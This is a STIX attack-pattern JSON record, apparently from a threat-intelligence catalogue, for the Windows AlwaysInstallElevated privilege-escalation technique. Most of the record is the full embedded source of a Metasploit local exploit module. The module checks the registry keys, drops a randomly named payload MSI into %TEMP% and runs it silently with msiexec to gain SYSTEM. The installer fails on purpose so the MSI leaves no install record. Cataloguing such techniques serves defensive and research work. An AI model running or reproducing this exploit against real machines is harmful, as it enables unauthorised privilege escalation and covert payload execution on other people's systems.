{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--acf58263-0502-4047-a8ce-8fb53d79de88",
    "created": "2024-08-14T16:49:58.934519Z",
    "modified": "2024-08-14T16:49:58.934522Z",
    "name": "Windows AlwaysInstallElevated MSI",
    "description": " This module checks the AlwaysInstallElevated registry keys which dictates if .MSI files should be installed with elevated privileges (NT AUTHORITY\\SYSTEM). The generated .MSI file has an embedded executable which is extracted and run by the installer. After execution the .MSI file intentionally fails installation (by calling some invalid VBS) to prevent it being registered on the system. By running this with the /quiet argument the error will not be seen by the user.  'License'       => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/local/always_install_elevated.rb",
            "external_id": "always_install_elevated.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www.greyhathacker.net/?p=185"
        },
        {
            "source_name": "reference",
            "url": "http://msdn.microsoft.com/en-us/library/aa367561(VS.85).aspx"
        },
        {
            "source_name": "reference",
            "url": "http://rewtdance.blogspot.co.uk/2013/03/metasploit-msi-payload-generation.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n  include Msf::Post::File\n  include Msf::Post::Windows::Registry\n\n\n  def initialize(info={})\n    super(update_info(info, {\n      'Name'          => 'Windows AlwaysInstallElevated MSI',\n      'Description'    => %q{\n          This module checks the AlwaysInstallElevated registry keys which dictates if\n        .MSI files should be installed with elevated privileges (NT AUTHORITY\\SYSTEM).\n        The generated .MSI file has an embedded executable which is extracted and run\n        by the installer. After execution the .MSI file intentionally fails installation\n        (by calling some invalid VBS) to prevent it being registered on the system.\n        By running this with the /quiet argument the error will not be seen by the user.\n      },\n      'License'       => MSF_LICENSE,\n      'Author'        =>\n        [\n          'Ben Campbell',\n          'Parvez Anwar' # discovery?/inspiration\n        ],\n      'Arch'          => [ ARCH_X86, ARCH_X64 ],\n      'Platform'      => [ 'win' ],\n      'SessionTypes'  => [ 'meterpreter' ],\n      'DefaultOptions' =>\n        {\n          'WfsDelay' => 10,\n          'EXITFUNC' => 'process',\n          'MSI::UAC' => true\n        },\n      'Targets'       =>\n        [\n          [ 'Windows', { } ],\n        ],\n      'References'    =>\n        [\n          [ 'URL', 'http://www.greyhathacker.net/?p=185' ],\n          [ 'URL', 'http://msdn.microsoft.com/en-us/library/aa367561(VS.85).aspx' ],\n          [ 'URL', 'http://rewtdance.blogspot.co.uk/2013/03/metasploit-msi-payload-generation.html']\n        ],\n      'DisclosureDate'=> '2010-03-18',\n      'DefaultTarget' => 0\n    }))\n\n    register_advanced_options([\n      OptString.new('LOG_FILE', [false, 'Remote path to output MSI log file to.', nil]),\n      OptBool.new('QUIET', [true, 'Run the MSI with the /quiet flag.', true])\n    ])\n  end\n\n  def check\n    install_elevated = \"AlwaysInstallElevated\"\n    installer = \"SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows\\\\Installer\"\n    hkcu = \"HKEY_CURRENT_USER\\\\#{installer}\"\n    hklm = \"HKEY_LOCAL_MACHINE\\\\#{installer}\"\n\n    local_machine_value = registry_getvaldata(hklm,install_elevated)\n\n    if local_machine_value.nil?\n      vprint_error(\"#{hklm}\\\\#{install_elevated} does not exist or is not accessible.\")\n      return Msf::Exploit::CheckCode::Safe\n    elsif local_machine_value == 0\n      vprint_error(\"#{hklm}\\\\#{install_elevated} is #{local_machine_value}.\")\n      return Msf::Exploit::CheckCode::Safe\n    else\n      vprint_good(\"#{hklm}\\\\#{install_elevated} is #{local_machine_value}.\")\n      current_user_value = registry_getvaldata(hkcu,install_elevated)\n    end\n\n    if current_user_value.nil?\n      vprint_error(\"#{hkcu}\\\\#{install_elevated} does not exist or is not accessible.\")\n      return Msf::Exploit::CheckCode::Safe\n    elsif current_user_value == 0\n      vprint_error(\"#{hkcu}\\\\#{install_elevated} is #{current_user_value}.\")\n      return Msf::Exploit::CheckCode::Safe\n    else\n      vprint_good(\"#{hkcu}\\\\#{install_elevated} is #{current_user_value}.\")\n      return Msf::Exploit::CheckCode::Vulnerable\n    end\n  end\n\n  def exploit\n\n    return unless check == Msf::Exploit::CheckCode::Vulnerable\n\n    msi_filename = Rex::Text.rand_text_alpha((rand(8)+6)) + \".msi\"\n    msi_source = generate_payload_msi\n\n    # Upload MSI\n    msi_destination = expand_path(\"%TEMP%\\\\#{msi_filename}\").strip\n    print_status(\"Uploading the MSI to #{msi_destination} ...\")\n\n    write_file(msi_destination, msi_source)\n    register_file_for_cleanup(msi_destination)\n\n    if datastore['LOG_FILE'].nil?\n      logging = \"\"\n    else\n      logging = \"/l* #{datastore['LOG_FILE']} \"\n    end\n\n    if datastore['QUIET']\n      quiet = \"/quiet \"\n    else\n      quiet = \"\"\n    end\n\n    cmd = \"msiexec.exe #{logging}#{quiet}/package #{msi_destination}\"\n\n    print_status(\"Executing MSI...\")\n    vprint_status(\"Executing: #{cmd}\")\n    begin\n      result = cmd_exec(cmd)\n    rescue Rex::TimeoutError\n      vprint_status(\"Execution timed out.\")\n    end\n    vprint_status(\"MSI command-line feedback: #{result}\")\n  end\nend\n",
    "x_mitre_disclosure_date": "2010-03-18",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}